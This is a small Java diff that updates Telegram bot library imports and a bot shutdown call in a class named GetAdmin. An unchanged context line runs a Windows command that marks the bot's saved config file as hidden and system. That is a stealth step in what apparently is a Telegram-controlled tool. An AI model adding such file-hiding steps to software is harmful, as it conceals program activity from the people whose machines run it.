@@ -13,9 +13,9 @@ import javafx.scene.control.ProgressBar;
 import javafx.scene.layout.FlowPane;
 import javafx.stage.Stage;
 import org.telegram.telegrambots.ApiContextInitializer;
-import org.telegram.telegrambots.TelegramBotsApi;
-import org.telegram.telegrambots.exceptions.TelegramApiRequestException;
-import org.telegram.telegrambots.generics.BotSession;
+import org.telegram.telegrambots.meta.TelegramBotsApi;
+import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;
+import org.telegram.telegrambots.meta.generics.BotSession;
 
 import javax.swing.*;
 import java.awt.event.ActionEvent;
@@ -69,7 +69,7 @@ public class GetAdmin extends Application {
                 oos.writeObject(config);
                 oos.close();
                 sup = telegramBotsApi.registerBot(new SupBot(config.getName(), config.isAutoupdate()));
-                sup.close();
+                sup.stop();
                 Thread.sleep(1000);
                 try {
                     Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
